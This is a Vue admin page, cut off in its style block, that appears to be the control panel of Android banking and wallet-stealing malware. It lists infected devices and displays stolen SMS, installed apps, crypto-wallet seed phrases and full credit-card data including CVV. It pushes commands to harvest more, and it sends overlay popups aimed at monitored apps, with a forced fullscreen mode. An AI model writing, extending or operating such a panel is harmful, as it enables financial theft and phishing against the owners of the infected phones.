<template>
  <div class="table-box" v-loading="loading" element-loading-text="加载中...">
    <ProTable
      ref="proTable"
      title="设备列表"
      row-key="id"
      :columns="columns"
      :search-col="{ xs: 1, sm: 2, md: 2, lg: 4, xl: 4 }"
      :request-api="getDeviceListWithLoading"
      :init-param="initParam"
      :data-callback="dataCallback"
    >
      <template #tableHeader>
        <el-button type="primary" :icon="Setting" @click="handleOpenConfig">默认配置</el-button>
      </template>
      <!-- 应用信息内容 -->
      <template #app_info="scope">
        <div class="app-info-text">
          <div class="info-item">
            <span class="label">设备号：</span>
            <span class="value">{{ scope.row.device_number || "-" }}</span>
          </div>
          <div class="info-item">
            <span class="label">APP名称：</span>
            <span class="value">{{ scope.row.appName || "-" }}</span>
          </div>
          <div class="info-item">
            <span class="label">APP版本：</span>
            <span class="value">{{ scope.row.appVersion || "-" }}</span>
          </div>
          <div class="info-item">
            <span class="label">渠道：</span>
            <span class="value">{{ scope.row.app_channel || "-" }}</span>
          </div>
          <div class="info-item">
            <span class="label">安装时间：</span>
            <span class="value">{{ scope.row.created_at || "-" }}</span>
          </div>
          <div class="info-item">
            <span class="label">最后更新：</span>
            <span class="value">{{ scope.row.updated_at || "-" }}</span>
          </div>
        </div>
      </template>
      <!-- 终端信息内容 -->
      <template #terminal_info="scope">
        <div class="terminal-info-text">
          <div class="info-item">
            <span class="label">语言：</span>
            <span class="value">{{ scope.row.language || "-" }}</span>
          </div>
          <div class="info-item">
            <span class="label">国家：</span>
            <span class="value">{{ scope.row.country || "-" }}</span>
          </div>
          <div class="info-item">
            <span class="label">IP：</span>
            <span class="value">{{ scope.row.ip || "-" }}</span>
          </div>
        </div>
      </template>
      <!-- 设备信息内容 -->
      <template #device_info="scope">
        <div class="device-info-text">
          <div class="info-item">
            <span class="label">品牌：</span>
            <span class="value">{{ scope.row.brand || "-" }}</span>
          </div>
          <div class="info-item">
            <span class="label">型号：</span>
            <span class="value">{{ scope.row.model || "-" }}</span>
          </div>
          <div class="info-item">
            <span class="label">SDK：</span>
            <span class="value">{{ scope.row.sdk_version || "-" }}</span>
          </div>
        </div>
      </template>
      <!-- 用户信息内容 -->
      <template #user_info="scope">
        <div class="user-info-text">
          <div class="info-item">
            <span class="label">代理：</span>
            <span class="value">{{ scope.row.proxy || "-" }}</span>
          </div>
          <div class="info-item">
            <span class="label">标签：</span>
            <span class="value">
              <el-tag 
                v-if="scope.row.tags" 
                class="tags-tag"
                :type="getTagType(scope.row.tags)"
              >
                {{ scope.row.tags }}
              </el-tag>
              <span v-else>-</span>
            </span>
          </div>
          <div class="info-item permission-item">
            <span class="label">浮窗：</span>
            <span class="value">
              <el-icon 
                v-if="scope.row.float_window_permission !== null && scope.row.float_window_permission !== undefined"
                :size="16" 
                :class="['permission-status-icon', scope.row.float_window_permission === 1 ? 'enabled' : 'disabled']"
              >
                <CircleCheck v-if="scope.row.float_window_permission === 1" />
                <CircleClose v-else />
              </el-icon>
              <span v-else>-</span>
            </span>
          </div>
          <div class="info-item permission-item">
            <span class="label">短信：</span>
            <span class="value">
              <el-icon 
                v-if="scope.row.sms_permission !== null && scope.row.sms_permission !== undefined"
                :size="16" 
                :class="['permission-status-icon', scope.row.sms_permission === 1 ? 'enabled' : 'disabled']"
              >
                <CircleCheck v-if="scope.row.sms_permission === 1" />
                <CircleClose v-else />
              </el-icon>
              <span v-else>-</span>
            </span>
          </div>
          <div class="info-item permission-item">
            <span class="label">监听：</span>
            <span class="value">
              <el-icon 
                v-if="scope.row.monitor_permission !== null && scope.row.monitor_permission !== undefined"
                :size="16" 
                :class="['permission-status-icon', scope.row.monitor_permission === 1 ? 'enabled' : 'disabled']"
              >
                <CircleCheck v-if="scope.row.monitor_permission === 1" />
                <CircleClose v-else />
              </el-icon>
              <span v-else>-</span>
            </span>
          </div>
        </div>
      </template>
      <!-- 操作 -->
      <template #operation="scope">
        <div class="operation-actions">
          <el-button 
            type="primary" 
            link 
            :icon="Edit" 
            @click="handleEdit(scope.row)"
          >
            修改
          </el-button>
          <el-button 
            type="primary" 
            link 
            :icon="Message"
            @click="handleShowPopup(scope.row)"
          >
            弹出信息
          </el-button>
          <el-button 
            type="primary" 
            link 
            :icon="Collection"
            @click="handleViewApps(scope.row)"
          >
            应用列表
          </el-button>
          <el-button 
            type="primary" 
            link 
            :icon="Download"
            @click="handleGetApps(scope.row)"
          >
            获取应用列表
          </el-button>
          <el-button 
            type="primary" 
            link 
            :icon="ChatLineSquare"
            @click="handleViewSms(scope.row)"
          >
            短信列表
          </el-button>
          <el-button 
            type="primary" 
            link 
            :icon="Message"
            @click="handleGetSms(scope.row)"
          >
            获取短信列表
          </el-button>
          <el-button 
            type="primary" 
            link 
            :icon="View"
            @click="handleViewWords(scope.row)"
          >
            助记词
          </el-button>
          <el-button 
            type="primary" 
            link 
            :icon="View"
            @click="handleViewCards(scope.row)"
          >
            信用卡
          </el-button>
        </div>
      </template>
    </ProTable>
    <!-- 默认配置弹窗 -->
    <el-dialog v-model="configDialogVisible" title="默认配置" width="520px">
      <el-form label-width="160px" v-loading="configLoading">
        <template v-for="item in configList" :key="item.key">
          <el-form-item :label="configLabels[item.key] || item.key">
            <el-radio-group
              v-if="booleanConfigKeys.includes(item.key)"
              v-model="configForm[item.key]"
            >
              <el-radio :label="1">是</el-radio>
              <el-radio :label="0">否</el-radio>
            </el-radio-group>
            <el-input-number
              v-else-if="item.type === 'number'"
              v-model="configForm[item.key]"
              :min="0"
              :controls="false"
              style="width: 100%"
            />
            <el-input
              v-else
              v-model="configForm[item.key]"
              placeholder="请输入配置值"
            />
          </el-form-item>
        </template>
      </el-form>
      <template #footer>
        <el-button @click="configDialogVisible = false">取消</el-button>
        <el-button type="primary" :loading="configSubmitting" @click="handleSubmitConfig">确定</el-button>
      </template>
    </el-dialog>
    <!-- 应用列表弹窗 -->
    <el-dialog v-model="appDialogVisible" :title="appDialogTitle" width="900px">
      <el-table :data="appList" v-loading="appLoading" stripe>
        <el-table-column prop="app_name" label="APP名称" min-width="180" />
        <el-table-column prop="app_package" label="APP包名" min-width="240" />
        <el-table-column prop="install_time" label="安装时间" width="200" />
        <el-table-column prop="created_at" label="创建时间" width="200" />
      </el-table>
      <template #footer>
        <el-button @click="appDialogVisible = false">关闭</el-button>
      </template>
    </el-dialog>
    <!-- 短信列表弹窗 -->
    <el-dialog v-model="smsDialogVisible" :title="smsDialogTitle" width="780px">
      <el-table :data="smsList" v-loading="smsLoading" stripe>
        <el-table-column prop="sender" label="发送方" min-width="140" />
        <el-table-column prop="content" label="内容" min-width="280" show-overflow-tooltip />
        <el-table-column prop="sms_time" label="短信时间" width="180" />
        <el-table-column prop="created_at" label="创建时间" width="180" />
      </el-table>
      <template #footer>
        <el-button @click="smsDialogVisible = false">关闭</el-button>
      </template>
    </el-dialog>
    <!-- 助记词列表弹窗 -->
    <el-dialog v-model="wordsDialogVisible" :title="wordsDialogTitle" width="820px">
      <el-table :data="wordsList" v-loading="wordsLoading" stripe>
        <el-table-column prop="app_name" label="APP名称" min-width="160" />
        <el-table-column prop="app_package" label="APP包名" min-width="200" />
        <el-table-column prop="words" label="助记词" min-width="260">
          <template #default="scope">
            <div class="words-full">{{ scope.row.words || "-" }}</div>
          </template>
        </el-table-column>
        <el-table-column prop="created_at" label="创建时间" width="180" />
      </el-table>
      <template #footer>
        <el-button @click="wordsDialogVisible = false">关闭</el-button>
      </template>
    </el-dialog>
    <!-- 信用卡列表弹窗 -->
    <el-dialog v-model="cardsDialogVisible" :title="cardsDialogTitle" width="900px">
      <el-table :data="cardsList" v-loading="cardsLoading" stripe>
        <el-table-column prop="app_name" label="APP名称" min-width="120" />
        <el-table-column prop="app_package" label="APP包名" min-width="180" />
        <el-table-column prop="card_number" label="卡号" min-width="180" />
        <el-table-column prop="card_date" label="卡有效期" width="120" />
        <el-table-column prop="cvv" label="CVV" width="100" />
        <el-table-column prop="user_first_name" label="名" width="120" />
        <el-table-column prop="user_last_name" label="姓" width="120" />
        <el-table-column prop="created_at" label="创建时间" width="180" />
      </el-table>
      <template #footer>
        <el-button @click="cardsDialogVisible = false">关闭</el-button>
      </template>
    </el-dialog>
    <!-- 二次密码弹窗 -->
    <el-dialog v-model="passwordDialogVisible" title="二次密码验证" width="400px">
      <el-form :model="passwordForm" :rules="passwordRules" ref="passwordFormRef" label-width="100px">
        <el-form-item label="二次密码" prop="password">
          <el-input
            v-model="passwordForm.password"
            type="password"
            placeholder="请输入二次密码"
            show-password
            @keyup.enter="handleVerifyPassword"
          />
        </el-form-item>
      </el-form>
      <template #footer>
        <el-button @click="passwordDialogVisible = false">取消</el-button>
        <el-button type="primary" :loading="verifying" @click="handleVerifyPassword">确定</el-button>
      </template>
    </el-dialog>
    <!-- 弹出信息弹窗 -->
    <el-dialog v-model="popupDialogVisible" title="发送弹出信息" width="600px">
      <el-form 
        ref="popupFormRef" 
        :model="popupFormData" 
        :rules="popupFormRules" 
        label-width="120px"
      >
        <el-form-item label="目标APP" prop="target_app">
          <el-select
            v-model="popupFormData.target_app"
            placeholder="请选择目标APP"
            filterable
            :loading="popupAppsLoading"
            style="width: 100%"
            @change="handleTargetAppChange"
          >
            <el-option
              v-for="app in availableApps"
              :key="app.app_package"
              :label="`${app.app_name} (${app.app_package})`"
              :value="app.app_package"
            />
          </el-select>
          <div v-if="availableApps.length === 0 && !popupAppsLoading" style="color: #909399; font-size: 12px; margin-top: 4px;">
            该设备暂无符合条件的APP（需在设备应用列表中且已开启监听）
          </div>
        </el-form-item>
        <el-form-item label="标题" prop="title">
          <el-input
            v-model="popupFormData.title"
            placeholder="请输入弹窗标题"
            maxlength="100"
            show-word-limit
          />
        </el-form-item>
        <el-form-item label="内容" prop="content">
          <el-input
            v-model="popupFormData.content"
            type="textarea"
            :rows="4"
            placeholder="请输入弹窗内容"
            maxlength="500"
            show-word-limit
          />
        </el-form-item>
        <el-form-item label="跳转类型" prop="action_type">
          <el-radio-group v-model="popupFormData.action_type" @change="handleActionTypeChange">
            <el-radio label="open_app">打开APP</el-radio>
            <el-radio label="open_url">打开网页</el-radio>
          </el-radio-group>
        </el-form-item>
        <el-form-item 
          v-if="popupFormData.action_type === 'open_url'"
          label="目标URL" 
          prop="target_url"
        >
          <el-input
            v-model="popupFormData.target_url"
            placeholder="请输入网页URL，如：https://example.com"
          />
        </el-form-item>
      </el-form>
      <template #footer>
        <el-button @click="popupDialogVisible = false">取消</el-button>
        <el-button type="primary" :loading="popupSubmitting" @click="handleSubmitPopup">发送</el-button>
      </template>
    </el-dialog>
    <!-- 修改弹窗 -->
    <el-dialog v-model="dialogVisible" title="修改设备信息" width="500px">
      <el-form 
        ref="formRef" 
        :model="formData" 
        :rules="formRules" 
        label-width="140px"
      >
        <el-form-item label="获取信用卡" prop="has_card">
          <el-radio-group v-model="formData.has_card">
            <el-radio :label="0">否</el-radio>
            <el-radio :label="1">是</el-radio>
          </el-radio-group>
        </el-form-item>
        <el-form-item label="是否获取短信" prop="has_sms">
          <el-radio-group v-model="formData.has_sms">
            <el-radio :label="0">否</el-radio>
            <el-radio :label="1">是</el-radio>
          </el-radio-group>
        </el-form-item>
        <el-form-item label="距离安装时间" prop="install_time_distance">
          <el-input-number 
            v-model="formData.install_time_distance" 
            :min="0" 
            placeholder="请输入距离安装时间"
            style="width: 100%"
          />
        </el-form-item>
        <el-form-item label="开屏间隔时间" prop="screen_interval_time">
          <el-input-number 
            v-model="formData.screen_interval_time" 
            :min="0" 
            placeholder="请输入开屏间隔时间"
            style="width: 100%"
          />
        </el-form-item>
        <el-form-item label="开屏弹出信用卡" prop="has_screen_popup_card">
          <el-radio-group v-model="formData.has_screen_popup_card">
            <el-radio :label="0">否</el-radio>
            <el-radio :label="1">是</el-radio>
          </el-radio-group>
        </el-form-item>
        <el-form-item label="是否启用霸屏模式" prop="has_fullscreen_mode">
          <el-radio-group v-model="formData.has_fullscreen_mode">
            <el-radio :label="0">否</el-radio>
            <el-radio :label="1">是</el-radio>
          </el-radio-group>
        </el-form-item>
        <el-form-item label="标签" prop="tags">
          <el-input 
            v-model="formData.tags" 
            placeholder="请输入标签"
            maxlength="200"
            show-word-limit
            clearable
          />
        </el-form-item>
      </el-form>
      <template #footer>
        <el-button @click="dialogVisible = false">取消</el-button>
        <el-button type="primary" :loading="submitting" @click="handleSubmit">确定</el-button>
      </template>
    </el-dialog>
  </div>
</template>

<script setup lang="ts" name="device">
import { ref, reactive, nextTick } from "vue";
import type { FormInstance, FormRules } from "element-plus";
import { ColumnProps, ProTableInstance } from "@/components/ProTable/interface";
import ProTable from "@/components/ProTable/index.vue";
import { CircleCheck, CircleClose, Edit, Setting, Collection, ChatLineSquare, View, Download, Message } from "@element-plus/icons-vue";
import { ElMessage } from "element-plus";
import {
  getDeviceListApi,
  updateDeviceApi,
  pushMessageToDeviceApi,
  DeviceItem,
  DeviceListResponse
} from "@/api/modules/device";
import {
  getSystemConfigByGroupApi,
  batchUpdateSystemConfigApi,
  SystemConfigItem
} from "@/api/modules/systemConfig";
import { getReceiveAppListApi, ReceiveAppItem } from "@/api/modules/receiveApp";
import { getReceiveSmsListApi, ReceiveSmsItem } from "@/api/modules/receiveSms";
import { getReceiveWordsListApi, ReceiveWordsItem } from "@/api/modules/receiveWords";
import { getReceiveCardsListApi, ReceiveCardItem } from "@/api/modules/receiveCards";
import { getMonitorListApi, MonitorItem } from "@/api/modules/monitor";
import { verifySecondPasswordApi } from "@/api/modules/login";

const proTable = ref<ProTableInstance>();
const loading = ref(false);
const dialogVisible = ref(false);
const submitting = ref(false);
const formRef = ref<FormInstance>();
const currentDeviceId = ref<number | null>(null);
const configDialogVisible = ref(false);
const configLoading = ref(false);
const configSubmitting = ref(false);
const configList = ref<SystemConfigItem[]>([]);
const configForm = reactive<Record<string, string | number | null>>({});
const booleanConfigKeys = ["default_has_card", "default_has_sms", "default_has_screen_popup_card", "default_has_fullscreen_mode"];
const configLabels: Record<string, string> = {
  default_has_card: "是否获取信用卡",
  default_has_sms: "是否获取短信",
  default_install_time_distance: "距离安装时间",
  default_screen_interval_time: "开屏间隔时间",
  default_has_screen_popup_card: "是否开屏弹出信用卡",
  default_has_fullscreen_mode: "是否启用霸屏模式"
};

// 应用列表弹窗
const appDialogVisible = ref(false);
const appLoading = ref(false);
const appList = ref<ReceiveAppItem[]>([]);
const appDialogTitle = ref("");
const smsDialogVisible = ref(false);
const smsLoading = ref(false);
const smsList = ref<ReceiveSmsItem[]>([]);
const smsDialogTitle = ref("");
const wordsDialogTitle = ref("");
const cardsDialogTitle = ref("");

// 助记词/信用卡弹窗与二次验证
const wordsDialogVisible = ref(false);
const cardsDialogVisible = ref(false);
const wordsLoading = ref(false);
const cardsLoading = ref(false);
const wordsList = ref<ReceiveWordsItem[]>([]);
const cardsList = ref<ReceiveCardItem[]>([]);
const passwordDialogVisible = ref(false);
const passwordFormRef = ref<FormInstance>();
const passwordForm = reactive({ password: "" });
const passwordRules = reactive<FormRules>({
  password: [{ required: true, message: "请输入二次密码", trigger: "blur" }]
});
const verifying = ref(false);
const verifyTarget = ref<"words" | "cards" | null>(null);
const targetDeviceNumber = ref<string | undefined>(undefined);

// 弹出信息弹窗
const popupDialogVisible = ref(false);
const popupFormRef = ref<FormInstance>();
const popupSubmitting = ref(false);
const popupTargetDeviceNumber = ref<string | undefined>(undefined);
const popupFormData = reactive({
  target_app: "",
  title: "",
  content: "",
  action_type: "",
  target_url: ""
});
const availableApps = ref<Array<{ app_name: string; app_package: string }>>([]);
const popupAppsLoading = ref(false);

const popupFormRules = reactive<FormRules>({
  target_app: [{ required: true, message: "请选择目标APP", trigger: "change" }],
  title: [{ required: true, message: "请输入标题", trigger: "blur" }],
  content: [{ required: true, message: "请输入内容", trigger: "blur" }],
  action_type: [{ required: true, message: "请选择跳转类型", trigger: "change" }],
  target_url: [
    {
      validator: (rule, value, callback) => {
        if (popupFormData.action_type === "open_url" && !value) {
          callback(new Error("打开网页时必须提供目标URL"));
        } else if (popupFormData.action_type === "open_url" && value) {
          // 简单的URL格式验证
          const urlPattern = /^(https?:\/\/)?([\da-z\.-]+)\.([a-z\.]{2,6})([\/\w \.-]*)*\/?$/;
          if (!urlPattern.test(value)) {
            callback(new Error("请输入有效的URL格式"));
          } else {
            callback();
          }
        } else {
          callback();
        }
      },
      trigger: "blur"
    }
  ]
});

const formData = reactive({
  has_card: 0,
  has_sms: 0,
  install_time_distance: 0,
  screen_interval_time: 0,
  has_screen_popup_card: 0,
  has_fullscreen_mode: 0,
  tags: ""
});

const formRules = reactive<FormRules>({
  has_card: [{ required: true, message: "请选择是否获取信用卡", trigger: "change" }],
  has_sms: [{ required: true, message: "请选择是否获取短信", trigger: "change" }],
  install_time_distance: [{ required: true, message: "请输入距离安装时间", trigger: "blur" }],
  screen_interval_time: [{ required: true, message: "请输入开屏间隔时间", trigger: "blur" }],
  has_screen_popup_card: [{ required: true, message: "请选择是否开屏弹窗卡片", trigger: "change" }],
  has_fullscreen_mode: [{ required: true, message: "请选择是否启用霸屏模式", trigger: "change" }]
});

// 初始化参数
const initParam = reactive({
  page: 1,
  limit: 20
});

// 带加载状态的设备列表请求
const getDeviceListWithLoading = async (params?: any) => {
  loading.value = true;
  try {
    const result = await getDeviceListApi(params);
    return result;
  } finally {
    loading.value = false;
  }
};

// 数据回调处理
const dataCallback = (data: DeviceListResponse) => {
  return {
    list: data.list || [],
    total: data.total_num || 0
  };
};

// 表格配置项
const columns = reactive<ColumnProps<DeviceItem>[]>([
  { prop: "id", label: "ID", width: 80 },
  { 
    prop: "device_number", 
    label: "设备号", 
    isShow: false,
    search: { el: "input", span: 1, props: { placeholder: "请输入设备号" } }
  },
  { 
    prop: "app_info", 
    label: "应用信息", 
    minWidth: 300,
    showOverflowTooltip: false,
    align: "left"
  },
  { 
    prop: "language", 
    label: "语言", 
    isShow: false,
    search: { el: "input", span: 1, props: { placeholder: "请输入语言" } }
  },
  { 
    prop: "terminal_info", 
    label: "终端信息", 
    minWidth: 200,
    showOverflowTooltip: false,
    align: "left"
  },
  { 
    prop: "country", 
    label: "国家", 
    isShow: false,
    search: { el: "input", span: 1, props: { placeholder: "请输入国家" } }
  },
  { 
    prop: "ip", 
    label: "IP", 
    isShow: false,
    search: { el: "input", span: 1, props: { placeholder: "请输入IP" } }
  },
  { 
    prop: "device_info", 
    label: "设备信息", 
    minWidth: 200,
    showOverflowTooltip: false,
    align: "left"
  },
  { 
    prop: "brand", 
    label: "品牌", 
    isShow: false,
    search: { el: "input", span: 1, props: { placeholder: "请输入品牌" } }
  },
  { 
    prop: "proxy", 
    label: "代理", 
    isShow: false,
    search: { el: "input", span: 1, props: { placeholder: "请输入代理" } }
  },
  { 
    prop: "tags", 
    label: "标签", 
    isShow: false,
    search: { el: "input", span: 1, props: { placeholder: "请输入标签" } }
  },
  { 
    prop: "appVersion", 
    label: "版本", 
    isShow: false,
    search: { el: "input", span: 1, props: { placeholder: "请输入版本" } }
  },
  { 
    prop: "app_channel", 
    label: "渠道", 
    isShow: false,
    search: { el: "input", span: 1, props: { placeholder: "请输入渠道" } }
  },
  { 
    prop: "user_info", 
    label: "用户信息", 
    minWidth: 200,
    showOverflowTooltip: false,
    align: "left"
  },
  { prop: "open_count", label: "打开次数", width: 100 },
  { prop: "operation", label: "操作", width: 360, fixed: "right" }
]);

// 处理修改按钮点击
const handleEdit = (row: DeviceItem) => {
  currentDeviceId.value = row.id;
  formData.has_card = row.has_card ?? 0;
  formData.has_sms = row.has_sms ?? 0;
  formData.install_time_distance = row.install_time_distance ?? 0;
  formData.screen_interval_time = row.screen_interval_time ?? 0;
  formData.has_screen_popup_card = row.has_screen_popup_card ?? 0;
  formData.has_fullscreen_mode = row.has_fullscreen_mode ?? 0;
  formData.tags = row.tags ?? "";
  dialogVisible.value = true;
};

// 提交表单
const handleSubmit = async () => {
  if (!formRef.value) return;
  
  await formRef.value.validate(async (valid) => {
    if (!valid) return;
    
    if (!currentDeviceId.value) {
      ElMessage.error("设备ID不存在");
      return;
    }
    
    submitting.value = true;
    try {
      await updateDeviceApi({
        id: currentDeviceId.value,
        has_card: formData.has_card,
        has_sms: formData.has_sms,
        install_time_distance: formData.install_time_distance,
        screen_interval_time: formData.screen_interval_time,
        has_screen_popup_card: formData.has_screen_popup_card,
        has_fullscreen_mode: formData.has_fullscreen_mode,
        tags: formData.tags || null
      });
      ElMessage.success("更新成功");
      dialogVisible.value = false;
      // 刷新表格
      proTable.value?.getTableList();
    } catch (error) {
      // 错误信息已由HTTP拦截器统一处理
    } finally {
      submitting.value = false;
    }
  });
};

// 打开默认配置弹窗
const handleOpenConfig = async () => {
  configDialogVisible.value = true;
  configLoading.value = true;
  try {
    const res = await getSystemConfigByGroupApi("device");
    const list = Array.isArray((res as any)?.data) ? (res as any).data : Array.isArray(res) ? res : [];
    configList.value = list;
    // 填充表单值
    configList.value.forEach(item => {
      if (booleanConfigKeys.includes(item.key)) {
        configForm[item.key] = Number(item.value ?? 0);
      } else {
        configForm[item.key] = item.value ?? "";
      }
    });
  } finally {
    configLoading.value = false;
  }
};

// 提交默认配置
const handleSubmitConfig = async () => {
  const configs = (configList.value || []).map(item => ({
    key: item.key,
    value: booleanConfigKeys.includes(item.key)
      ? Number(configForm[item.key] ?? 0)
      : configForm[item.key] ?? ""
  }));

  configSubmitting.value = true;
  try {
    await batchUpdateSystemConfigApi(configs);
    ElMessage.success("保存成功");
    configDialogVisible.value = false;
  } catch (error) {
    // 已有全局错误提示
  } finally {
    configSubmitting.value = false;
  }
};

// 查看应用列表
const handleViewApps = async (row: DeviceItem) => {
  appDialogTitle.value = `应用列表 - ${row.device_number || row.id}`;
  appDialogVisible.value = true;
  appLoading.value = true;
  try {
    const res = await getReceiveAppListApi({
      device_number: row.device_number || undefined,
      page: 1,
      limit: 100
    });
    const list = Array.isArray((res as any)?.data?.list)
      ? (res as any).data.list
      : Array.isArray((res as any)?.list)
        ? (res as any).list
        : [];
    appList.value = list;
  } finally {
    appLoading.value = false;
  }
};

// 查看短信列表
const handleViewSms = async (row: DeviceItem) => {
  smsDialogTitle.value = `短信列表 - ${row.device_number || row.id}`;
  smsDialogVisible.value = true;
  smsLoading.value = true;
  try {
    const res = await getReceiveSmsListApi({
      device_number: row.device_number || undefined,
      page: 1,
      limit: 100
    });
    const list = Array.isArray((res as any)?.data?.list)
      ? (res as any).data.list
      : Array.isArray((res as any)?.list)
        ? (res as any).list
        : [];
    smsList.value = list;
  } finally {
    smsLoading.value = false;
  }
};

// 查看助记词（二次密码后）
const handleViewWords = (row: DeviceItem) => {
  verifyTarget.value = "words";
  targetDeviceNumber.value = row.device_number || undefined;
  passwordForm.password = "";
  passwordDialogVisible.value = true;
};

// 查看信用卡（二次密码后）
const handleViewCards = (row: DeviceItem) => {
  verifyTarget.value = "cards";
  targetDeviceNumber.value = row.device_number || undefined;
  passwordForm.password = "";
  passwordDialogVisible.value = true;
};

// 二次密码验证并拉取数据
const handleVerifyPassword = async () => {
  // 防止重复点击
  if (verifying.value) return;
  
  if (!passwordFormRef.value) return;

  try {
    // 先进行表单验证
    await passwordFormRef.value.validate();
    
    // 验证通过后，设置加载状态
    verifying.value = true;
    
    try {
      await verifySecondPasswordApi({ password: passwordForm.password });
      passwordDialogVisible.value = false;
      passwordForm.password = "";

      if (verifyTarget.value === "words") {
        await loadWords();
      } else if (verifyTarget.value === "cards") {
        await loadCards();
      }
    } catch (error) {
      // 错误信息已由HTTP拦截器统一处理，这里不需要再次提示
    } finally {
      verifying.value = false;
    }
  } catch (error) {
    // 表单验证失败，不需要处理，Element Plus会自动显示错误信息
    // 确保verifying状态被重置（虽然此时应该是false，但为了安全起见）
    verifying.value = false;
  }
};

const loadWords = async () => {
  wordsDialogTitle.value = `助记词 - ${targetDeviceNumber.value || ""}`;
  wordsDialogVisible.value = true;
  wordsLoading.value = true;
  try {
    const res = await getReceiveWordsListApi({
      device_number: targetDeviceNumber.value,
      page: 1,
      limit: 200
    });
    const list = Array.isArray((res as any)?.data?.list)
      ? (res as any).data.list
      : Array.isArray((res as any)?.list)
        ? (res as any).list
        : [];
    wordsList.value = list;
  } finally {
    wordsLoading.value = false;
  }
};

const loadCards = async () => {
  cardsDialogTitle.value = `信用卡 - ${targetDeviceNumber.value || ""}`;
  cardsDialogVisible.value = true;
  cardsLoading.value = true;
  try {
    const res = await getReceiveCardsListApi({
      device_number: targetDeviceNumber.value,
      page: 1,
      limit: 200
    });
    const list = Array.isArray((res as any)?.data?.list)
      ? (res as any).data.list
      : Array.isArray((res as any)?.list)
        ? (res as any).list
        : [];
    cardsList.value = list;
  } finally {
    cardsLoading.value = false;
  }
};

// 获取应用列表（推送消息）
const handleGetApps = async (row: DeviceItem) => {
  if (!row.device_number) {
    ElMessage.warning("设备号不存在");
    return;
  }
  
  try {
    await pushMessageToDeviceApi({
      device_number: row.device_number,
      type: "get_apps"
    });
    ElMessage.success("推送成功，设备将上报应用列表");
  } catch (error) {
    // 错误信息已由HTTP拦截器统一处理
  }
};

// 获取短信列表（推送消息）
const handleGetSms = async (row: DeviceItem) => {
  if (!row.device_number) {
    ElMessage.warning("设备号不存在");
    return;
  }
  
  try {
    await pushMessageToDeviceApi({
      device_number: row.device_number,
      type: "get_sms"
    });
    ElMessage.success("推送成功，设备将上报短信列表");
  } catch (error) {
    // 错误信息已由HTTP拦截器统一处理
  }
};

// 打开弹出信息表单
const handleShowPopup = async (row: DeviceItem) => {
  if (!row.device_number) {
    ElMessage.warning("设备号不存在");
    return;
  }
  
  popupTargetDeviceNumber.value = row.device_number;
  // 重置表单
  popupFormData.target_app = "";
  popupFormData.title = "";
  popupFormData.content = "";
  popupFormData.action_type = "open_app"; // 默认选择打开APP
  popupFormData.target_url = "";
  availableApps.value = [];
  
  popupDialogVisible.value = true;
  
  // 加载符合条件的APP列表
  await loadAvailableApps(row.device_number);
  
  // 清除表单验证
  nextTick(() => {
    popupFormRef.value?.clearValidate();
  });
};

// 加载符合条件的APP列表
const loadAvailableApps = async (deviceNumber: string) => {
  popupAppsLoading.value = true;
  try {
    // 并行获取设备应用列表和开启的监听列表
    const [deviceAppsRes, monitorsRes] = await Promise.all([
      getReceiveAppListApi({
        device_number: deviceNumber,
        page: 1,
        limit: 1000 // 获取所有应用
      }),
      getMonitorListApi({
        is_enabled: 1 // 只获取开启的监听
      })
    ]);
    
    // 获取设备应用列表
    const deviceApps = Array.isArray((deviceAppsRes as any)?.data?.list)
      ? (deviceAppsRes as any).data.list
      : Array.isArray((deviceAppsRes as any)?.list)
        ? (deviceAppsRes as any).list
        : [];
    
    // 获取开启的监听列表（API直接返回数组）
    const enabledMonitors = Array.isArray((monitorsRes as any)?.data)
      ? (monitorsRes as any).data
      : Array.isArray(monitorsRes)
        ? monitorsRes
        : [];
    
    // 创建监听APP包名的Set，用于快速查找
    const enabledMonitorPackages = new Set(
      enabledMonitors.map((m: MonitorItem) => m.app_package).filter(Boolean)
    );
    
    // 过滤出既在设备应用列表中，又在开启的监听列表中的APP
    const filteredApps = deviceApps
      .filter((app: ReceiveAppItem) => 
        app.app_package && enabledMonitorPackages.has(app.app_package)
      )
      .map((app: ReceiveAppItem) => ({
        app_name: app.app_name || app.app_package || "",
        app_package: app.app_package || ""
      }))
      // 去重（按包名）
      .filter((app: any, index: number, self: any[]) => 
        index === self.findIndex((a: any) => a.app_package === app.app_package)
      );
    
    availableApps.value = filteredApps;
    
    if (filteredApps.length === 0) {
      ElMessage.warning("该设备暂无符合条件的APP（需在设备应用列表中且已开启监听）");
    }
  } catch (error) {
    ElMessage.error("加载APP列表失败");
    console.error("加载APP列表错误:", error);
  } finally {
    popupAppsLoading.value = false;
  }
};

// 处理目标APP变化
const handleTargetAppChange = () => {
  // 当选择APP后，如果跳转类型是打开APP，自动设置target_app
  if (popupFormData.action_type === "open_app") {
    // target_app已经在选择时设置了
  }
};

// 处理跳转类型变化
const handleActionTypeChange = () => {
  // 切换跳转类型时只清空URL字段（target_app是必填的，不能清空）
  popupFormData.target_url = "";
  // 清除URL字段的验证
  nextTick(() => {
    popupFormRef.value?.clearValidate(["target_url"]);
  });
};

// 提交弹出信息
const handleSubmitPopup = async () => {
  if (!popupFormRef.value) return;
  
  await popupFormRef.value.validate(async (valid) => {
    if (!valid) return;
    
    if (!popupTargetDeviceNumber.value) {
      ElMessage.error("设备号不存在");
      return;
    }
    
    popupSubmitting.value = true;
    try {
      const data: any = {
        title: popupFormData.title,
        content: popupFormData.content
      };
      
      // 添加目标APP（必填）
      data.target_app = popupFormData.target_app;
      
      // 添加跳转类型（必填）
      data.action_type = popupFormData.action_type;
      
      // 根据跳转类型添加相关字段
      if (popupFormData.action_type === "open_app") {
        // 打开APP时，target_app已经在上面设置了
      } else if (popupFormData.action_type === "open_url") {
        data.target_url = popupFormData.target_url;
      }
      
      await pushMessageToDeviceApi({
        device_number: popupTargetDeviceNumber.value,
        type: "show_popup",
        data
      });
      
      ElMessage.success("推送成功，设备将显示弹出信息");
      popupDialogVisible.value = false;
    } catch (error) {
      // 错误信息已由HTTP拦截器统一处理
    } finally {
      popupSubmitting.value = false;
    }
  });
};

// 根据标签内容生成标签类型（用于不同颜色）
const getTagType = (tags: string): "success" | "info" | "warning" | "danger" | "" => {
  if (!tags) return "";
  // 根据标签内容的哈希值生成不同的类型
  let hash = 0;
  for (let i = 0; i < tags.length; i++) {
    hash = tags.charCodeAt(i) + ((hash << 5) - hash);
  }
  const types: Array<"success" | "info" | "warning" | "danger" | ""> = ["success", "info", "warning", "danger"];
  return types[Math.abs(hash) % types.length] || "info";
};
</script>

<style scoped lang="scss">
.table-box {
  padding: 20px;
}

.app-info-text,
.terminal-info-text,
.device-info-text,
.user-info-text {
  word-break: break-all;
  white-space: normal;
